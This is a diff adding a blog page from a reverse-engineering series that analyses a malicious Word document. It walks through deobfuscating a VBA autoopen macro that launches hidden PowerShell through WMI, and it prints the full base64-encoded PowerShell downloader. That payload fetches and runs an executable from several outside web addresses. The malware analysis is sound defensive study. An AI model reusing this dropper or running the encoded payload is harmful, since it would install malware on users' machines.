@@ -1,0 +1,108 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Macro analysis</title><meta content="Macro analysis" name=title><meta content=Falcon name=author><meta content=website property=og:type><meta content=https://0xf4lc0n.github.io/blog/first-steps-in-re/macro-analysis/ property=og:url><meta property=og:site_name><meta content="Macro analysis" property=og:title><meta content=https://0xf4lc0n.github.io/favicon.ico property=og:image><link href=https://0xf4lc0n.github.io/blog/first-steps-in-re/macro-analysis/ rel=canonical><link rel="shortcut icon" href=https://0xf4lc0n.github.io/favicon.ico type=image/x-icon><link href=https://0xf4lc0n.github.io/atom.xml rel=alternate title=RSS type=application/atom+xml><link href=https://0xf4lc0n.github.io/css/style.css rel=stylesheet><script defer src=https://0xf4lc0n.github.io/js/script.js></script><body><div class=wrapper><header><nav class=navBar><a href=/> /home/ </a><a href=/blog> /blog/ </a><a href=/about> /about/ </a><div class=themeSwitch><button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#darkMode></use></svg></button><button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#lightMode></use></svg></button></div></nav></header><main><h1>Macro analysis</h1><p>When I opened doc file in MS Office I saw a page with a picture that informed me about necessity of MS Word activation. What is more the picture was encouraging me to run a macro.<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/macro-analysis/img/office_active.png><p>Insted of doing this, I opened build-in editor for Visual Basic. (stroke ALT + F11)<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/macro-analysis/img/vb_edit.png><p>Here I started a macro deobfuscation. There was a lot of unnecessary lines including comments (beginning with ') or while loops with that code structure:<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>Heightshcf </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"Throughway Jewelery & Shoes generate Frozen rich Cayman Islands Dollar radical Avenue Macao Small"
+</span><span>
+</span><span>While Heightshcf </span><span style=color:#fe8019>=</span><span> wdXMLValidationStatusOK
+</span><span>Electronics__Clothinghab </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>CDate(</span><span style=color:#d3869b>726</span><span style=color:#fdf4c1>)
+</span><span>COMwli </span><span style=color:#fe8019>=</span><span> protocolwbq
+</span><span>transmittingqon </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>CDbl(</span><span style=color:#d3869b>537</span><span style=color:#fdf4c1>)
+</span><span>modularumu </span><span style=color:#fe8019>= </span><span style=color:#d3869b>598
+</span><span>SCSIfdw </span><span style=color:#fe8019>= </span><span style=color:#d3869b>260                            
+</span><span>Gorgeouswtk </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>Atn(Reactiverin)
+</span><span>Wend
+</span></code></pre><p>In fact that while loops will never process because the condition is always false so I didn’t waste time for analysing that mess. You can easily check it in debugger as I did.<p>In order to delete all unnecessary I used simple python script:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>sys
+</span><span>
+</span><span style=color:#fa5c4b>with </span><span style=color:#fabd2f>open</span><span style=color:#fdf4c1>(sys.argv[</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>], </span><span style=color:#b8bb26>'r'</span><span style=color:#fdf4c1>) </span><span style=color:#fa5c4b>as </span><span>fi, </span><span style=color:#fabd2f>open</span><span style=color:#fdf4c1>(sys.argv[</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>], </span><span style=color:#b8bb26>'w'</span><span style=color:#fdf4c1>) </span><span style=color:#fa5c4b>as </span><span>fo:
+</span><span>    while_flag </span><span style=color:#fe8019>= </span><span style=color:#d3869b>False
+</span><span>    </span><span style=color:#fa5c4b>for </span><span>line </span><span style=color:#fa5c4b>in </span><span>fi:
+</span><span>        </span><span style=color:#fa5c4b>if </span><span style=color:#b8bb26>'\'' </span><span style=color:#fe8019>in </span><span>line:
+</span><span>            index </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>line.find(</span><span style=color:#b8bb26>'\''</span><span style=color:#fdf4c1>)
+</span><span>            line </span><span style=color:#fe8019>= </span><span>line[:index]
+</span><span>            </span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>line.replace(</span><span style=color:#b8bb26>' '</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>''</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>!= </span><span style=color:#b8bb26>''</span><span>:
+</span><span>                line </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>'\n'
+</span><span>        </span><span style=color:#fa5c4b>elif </span><span style=color:#b8bb26>'While' </span><span style=color:#fe8019>in </span><span>line:
+</span><span>            </span><span style=color:#fa5c4b>while </span><span style=color:#fe8019>not </span><span>(</span><span style=color:#b8bb26>'Wend' </span><span style=color:#fe8019>in </span><span>line):
+</span><span>            line </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>fi.readline()
+</span><span>            line </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>""
+</span><span>        </span><span style=color:#fa5c4b>elif </span><span style=color:#b8bb26>'Heightshcf' </span><span style=color:#fe8019>in </span><span>line:
+</span><span>            line </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>""
+</span><span>        </span><span style=color:#fdf4c1>fo.write(line)
+</span></code></pre><p>After initial deobfuscation code looked like that:<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>Attribute VB_Name </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"Avonqtl"
+</span><span>Function </span><span style=color:#8ec07c>Gorgeous_Concrete_Gloveswip</span><span>()
+</span><span>On Error Resume </span><span style=color:#8ec07c>Next
+</span><span>Set Gorgeous_Concrete_Gloveswip </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>CreateObject(primarymhj </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>orangemkj(Ridgetjj.channelsioc </span><span style=color:#fe8019>+</span><span style=color:#fdf4c1> Awesomeiip))
+</span><span>Gorgeous_Concrete_Gloveswip.</span><span style=color:#fdf4c1>ShowWindow </span><span style=color:#fe8019>=</span><span> wdXMLValidationStatusOK
+</span><span>End </span><span style=color:#8ec07c>Function
+</span><span>Function </span><span style=color:#8ec07c>orangemkj</span><span>(</span><span style=color:#fdf4c1>Administratortqv</span><span>)
+</span><span>On Error Resume </span><span style=color:#8ec07c>Next
+</span><span>    channelsvou </span><span style=color:#fe8019>=</span><span> Administratortqv 
+</span><span>metricsiia </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"67" 
+</span><span>orangemkj </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>Replace(channelsvou, metricsiia, </span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>) 
+</span><span>End </span><span style=color:#8ec07c>Function
+</span><span>Sub </span><span style=color:#8ec07c>autoopen</span><span>()
+</span><span>On Error Resume </span><span style=color:#8ec07c>Next
+</span><span>Kuwaiti_Dinarzip 
+</span><span>End </span><span style=color:#8ec07c>Sub
+</span><span>
+</span><span>Attribute VB_Name </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"tf3rdgenerationjiu"
+</span><span>Function </span><span style=color:#8ec07c>Kuwaiti_Dinarzip</span><span>()
+</span><span>On Error Resume </span><span style=color:#8ec07c>Next
+</span><span>Valleyiti </span><span style=color:#fe8019>=</span><span> Burundivdl </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>"p" </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>orangemkj(Ridgetjj.Automotive__Healthjwm </span><span style=color:#fe8019>+</span><span style=color:#fdf4c1> Ridgetjj.Music__Babyulz) 
+</span><span>Delawarejjq </span><span style=color:#fe8019>=</span><span> Crossgroupnhp
+</span><span>Set Small_Metal_Mousendm </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>CreateObject(orangemkj(orangemkj(CStr(</span><span style=color:#d3869b>912051 </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>67 </span><span style=color:#fe8019>- </span><span style=color:#d3869b>912051</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>"676767winmgmts:676767Win32_Proc6767ess"</span><span style=color:#fdf4c1>)))
+</span><span>Delawarejjq </span><span style=color:#fe8019>=</span><span> Delawarejjq </span><span style=color:#fe8019>+</span><span> Small_Metal_Mousendm.</span><span style=color:#fdf4c1>Create</span><span>#(Valleyiti, Covesnhl, Gorgeous_Concrete_Gloveswip, matrixttd)
+</span><span>End </span><span style=color:#8ec07c>Function
+</span></code></pre><p>A bit better but there was still a lot to do. I started with autoopen() function, because the macro started execution from there. During analysing execution flow in debugger I deobfuscated the rest of the code.<p>Resulted code looked like that:<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span>Attribute VB_Name </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"tf3rdgenerationjiu"
+</span><span>
+</span><span>Function </span><span style=color:#8ec07c>create_process</span><span>()
+</span><span>On Error Resume </span><span style=color:#8ec07c>Next
+</span><span style=color:#b8bb26>'Automotive__Healthjwm - obfuscated string "owershell"
+</span><span style=color:#b8bb26>'</span><span>Music__Babyulz </span><span style=color:#fe8019>-</span><span> encoded PowerShell script
+</span><span>power_shell_command </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"p" </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>remove_string(Ridgetjj.Automotive__Healthjwm </span><span style=color:#fe8019>+</span><span style=color:#fdf4c1> Ridgetjj.Music__Babyulz)
+</span><span>Set win32_object </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>CreateObject(remove_string(</span><span style=color:#b8bb26>"676767winmgmts:676767Win32_Proc6767ess"</span><span style=color:#fdf4c1>))
+</span><span style=color:#b8bb26>'directory and pid are NULL 
+</span><span style=color:#b8bb26>win32_object_process = win32_object.Create#(power_shell_command, directory, win32_process_startup, pid)
+</span><span style=color:#b8bb26>End Function
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>Attribute VB_Name = "Avonqtl"
+</span><span style=color:#b8bb26>Function win32_process_startup()
+</span><span style=color:#b8bb26>On Error Resume Next
+</span><span style=color:#b8bb26>'</span><span>channelsioc </span><span style=color:#fe8019>-</span><span> obfuscated string </span><span style=color:#b8bb26>"winmgmnts:win32_processstartup"
+</span><span>Set win32_process_startup </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>CreateObject(remove_string(Ridgetjj.channelsioc))
+</span><span>win32_process_startup.</span><span style=color:#fdf4c1>ShowWindow </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0
+</span><span>End </span><span style=color:#8ec07c>Function
+</span><span>
+</span><span>Function </span><span style=color:#8ec07c>remove_string</span><span>(</span><span style=color:#fdf4c1>str_to_operate</span><span>)
+</span><span>On Error Resume </span><span style=color:#8ec07c>Next
+</span><span>remove_string </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>Replace(str_to_operate, </span><span style=color:#b8bb26>"67"</span><span style=color:#fdf4c1>, </span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>) 
+</span><span>End </span><span style=color:#8ec07c>Function
+</span><span>
+</span><span>Sub </span><span style=color:#8ec07c>autoopen</span><span>()
+</span><span>On Error Resume </span><span style=color:#8ec07c>Next 
+</span><span>create_process 
+</span><span>End </span><span style=color:#8ec07c>Sub
+</span></code></pre><p>I presented macro execution in following list:<ol><li>autoopen() function calls create_process<li>power_shell_command variable is initialized with string created by concatenation of “p” and string returned by remove_string function. Argument passed to remove_string is a string which is created by concatenation of two string from OLE object.<li>remove_string deletes all occurrence of “67” string in passed string.<li>After all in power_shell_command followed string is placed:</ol><pre class=language-powershell data-lang=powershell style=background:#282828;color:#fdf4c1aa><code class=language-powershell data-lang=powershell><span>    powershell </span><span style=color:#fe8019>-</span><span>enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQA...
+</span></code></pre><ol start=5><li>Next winmgmnts:win32_Process object is created which is used to create and run process.</ol><p>Next I used oledump to gain content of OLE objects<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>python oledump</span><span style=color:#fe8019>/</span><span>oledump.py </span><span style=color:#fdf4c1>PL_95054906484_68262954</span><span>.doc
+</span></code></pre><p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/macro-analysis/img/oledump.png><p>I assumed that PowerShell script would be in 18th stream (Big stream’s size suggested that).<pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span style=color:#fdf4c1>python oledump/oledump.py -s 18 PL_95054906484_68262954.doc </span><span style=color:#fe8019>></span><span style=color:#fdf4c1> payload.txt
+</span></code></pre><p>Then I cut contet which interested me.<pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span style=color:#fdf4c1>cat payload.txt </span><span style=color:#fe8019>| </span><span style=color:#fdf4c1>cut -d </span><span style=color:#b8bb26>'  '</span><span style=color:#fdf4c1> -f20 </span><span style=color:#fe8019>></span><span style=color:#fdf4c1> payload_cut.txt
+</span></code></pre><p>Additionally I dumped content of 16th and 22th stream.<pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span style=color:#fdf4c1>python oledump/oledump.py -s 16 PL_95054906484_68262954.doc </span><span style=color:#fe8019>></span><span style=color:#fdf4c1> process_startup.txt
+</span><span style=color:#fdf4c1>python oledump/oledump.py -s 22 PL_95054906484_68262954.doc </span><span style=color:#fe8019>></span><span style=color:#fdf4c1> power_shell.txt
+</span></code></pre><p>That streams contain strings “owershell -enco” or “winmgmts:win32_processstartup”.<p>In order to print all streams you can use that command:<pre class=language-bash data-lang=bash style=background:#282828;color:#fdf4c1aa><code class=language-bash data-lang=bash><span style=color:#fdf4c1>seq 12 </span><span style=color:#fe8019>| </span><span style=color:#fdf4c1>awk </span><span style=color:#b8bb26>'{ system("echo stream:  $1+13") system("python oledump/oledump.py PL_95054906484_68262954.doc -s " $+13) system("echo \n") }'
+</span></code></pre><p>Encoded payload:<pre class=language-txt data-lang=txt style=background:#282828;color:#fdf4c1aa><code class=language-txt data-lang=txt><span>PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABSAGUAZgBpAG4AZQBkAF8AUABsAGEAcwB0AGkAYwB
+</span><span>fAFMAbwBhAHAAegBwAHAAPQAnAEIAbwByAGQAZQByAHMAbwBkAGkAJwA7ACQAcgBlAGEAbAB0AGkAbQBlAHYAZgBiACAAPQAgACcAMQAyADYAJwA7ACQAaQBuAHYAbwBpA
+</span><span>MAZQBvAGEAagA9ACcAZgByAGEAbQBlAHIAbABqACcAOwAkAG0AaQBkAGQAbABlAHcAYQByAGUAbAB0AGsAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJ
+</span><span>wBcACcAKwAkAHIAZQBhAGwAdABpAG0AZQB2AGYAYgArACcALgBlAHgAZQAnADsAJABiAGEAYwBrAF8AdQBwAGoAdgBpAD0AJwBCAGUAcgBrAHMAaABpAHIAZQBrAHcAegAn
+</span><span>ADsAJABQAGwAYQB6AGEAawBwAGkAPQAuACgAJwBuAGUAdwAtACcAKwAnAG8AYgAnACsAJwBqAGUAYwB0ACcAKQAgAE4ARQB0AC4AVwBlAGIAQwBMAGkAZQBOAFQAOwAkAEQ
+</span><span>AeQBuAGEAbQBpAGMAcQBtAGIAPQAnAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBwAGkAZQBjAGUAbwBmAHAAYQBzAHMAaQBvAG4ALgBuAGUAdAAvADAAeAByAG4AbAAzAC8AYQ
+</span><span>AyADcAeABtADkAOQBmAGcAZABfAG8AbgA3AHgAcAAtADMAMQAxADMANAAxADgAOQAvAEAAaAB0AHQAcAA6AC8ALwB3AHcAdwAuAG0AYQByAGsAZQB0AGYAeABlAGwAaQB0AG
+</span><span>UALgBjAG8AbQAvAHcAcAAtAGEAZABtAGkAbgAvAHUAbgBuAEoAdABDAEgAawAvAEAAaAB0AHQAcABzADoALwAvAHQAYQBuAGEAbgBmAG8AbwBkAC4AYwBvAG0ALwB3AHAALQB
+</span><span>pAG4AYwBsAHUAZABlAHMALwB5AG8AYwBsAHcAeQBXAEUALwBAAGgAdAB0AHAAOgAvAC8AcgBhAGkAcwBhAGIAbwBvAGsALgBjAG8AbQAvAHcAcAAtAGMAbwBuAHQAZQBuAHQAL
+</span><span>wBOAGoAQgB0AHUAeABCAHoAawBEAC8AQABoAHQAdABwADoALwAvAGIAaQBzAHcAYQBsAGYAbwBvAGQAYwBpAHIAYwBsAGUALgBjAG8AbQAvAHYAYwBvAGIAaABsAG8AbgBzAC8
+</span><span>AawBhAGYANgBqAF8ANwAxAHcAegBrAGcAdgBxAHMAbwAtADgALwAnAC4AIgBzAFAAYABMAGkAdAAiACgAJwBAACcAKQA7ACQAQwBsAHUAYgBvAG0AYgA9ACcARQBzAHQAYQB0A
+</span><span>GUAcwB3AGoAcwAnADsAZgBvAHIAZQBhAGMAaAAoACQATQB1AHMAaQBjAF8AXwBHAGEAbQBlAHMAcABtAHUAIABpAG4AIAAkAEQAeQBuAGEAbQBpAGMAcQBtAGIAKQB7AHQAcgB5
+</span><span>AHsAJABQAGwAYQB6AGEAawBwAGkALgAiAGQATwBgAHcATgBgAGwATwBhAGAAZABmAGkATABFACIAKAAkAE0AdQBzAGkAYwBfAF8ARwBhAG0AZQBzAHAAbQB1ACwAIAAkAG0AaQB
+</span><span>kAGQAbABlAHcAYQByAGUAbAB0AGsAKQA7ACQAQQBwAHAAbABpAGMAYQB0AGkAbwBuAHMAaQBxAHIAPQAnAEcAcgBvAGMAZQByAHkAdABpAHcAJwA7AEkAZgAgACgAKAAmACgAJwB
+</span><span>HAGUAdAAnACsAJwAtAEkAJwArACcAdABlAG0AJwApACAAJABtAGkAZABkAGwAZQB3AGEAcgBlAGwAdABrACkALgAiAEwARQBgAE4AZwBUAGgAIgAgAC0AZwBlACAAMwA1ADYAMAA5
+</span><span>ACkAIAB7AFsARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgAiAHMAYABUAEEAUgB0ACIAKAAkAG0AaQBkAGQAbABlAHcAYQByAGUAbAB0AGsAKQA7ACQ
+</span><span>AdAByAGEAbgBzAGYAbwByAG0AdgBkAHAAPQAnAEIAZQBkAGYAbwByAGQAcwBoAGkAcgBlAGoAdwBjACcAOwBiAHIAZQBhAGsAOwAkAEMAbwBuAGMAcgBlAHQAZQBpAGoAYQA9ACcAcg
+</span><span>BlAGQAdQBuAGQAYQBuAHQAdwB3AGkAJwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAbQBvAHIAcABoAHQAcQBiAD0AJwBHAG8AcgBnAGUAbwB1AHMAXwBGAHIAZQBzAGgAXwBIAGEAdABpAH
+</span><span>EAYgAnAA==       
+</span></code></pre><h4 id=table-of-content>Table of content:</h4><ol><li><a href=/blog/first-steps-in-re/environment-configuration>Environment configuration</a><li><a href=/blog/first-steps-in-re/initial-analysis>Initial analysis</a><li><a href=/blog/first-steps-in-re/macro-analysis>Macro analysis</a><li><a href=/blog/first-steps-in-re/dropper-analysis>Dropper analysis</a><li><a href=/blog/first-steps-in-re/detonation>Detonation</a><li><a href=/blog/first-steps-in-re/domain-analysis>Domain analysis</a><li><a href=/blog/first-steps-in-re/detonation-v2>Detonation ver. 2</a><li><a href=/blog/first-steps-in-re/summary>Summary</a></ol><p class=tagsData></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br> Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a> colors.<br></div><div class=footRight><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=icons__background href=https://0xf4lc0n.github.io/atom.xml target=_blank><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#rss></use></svg></a></div></div></footer></div>
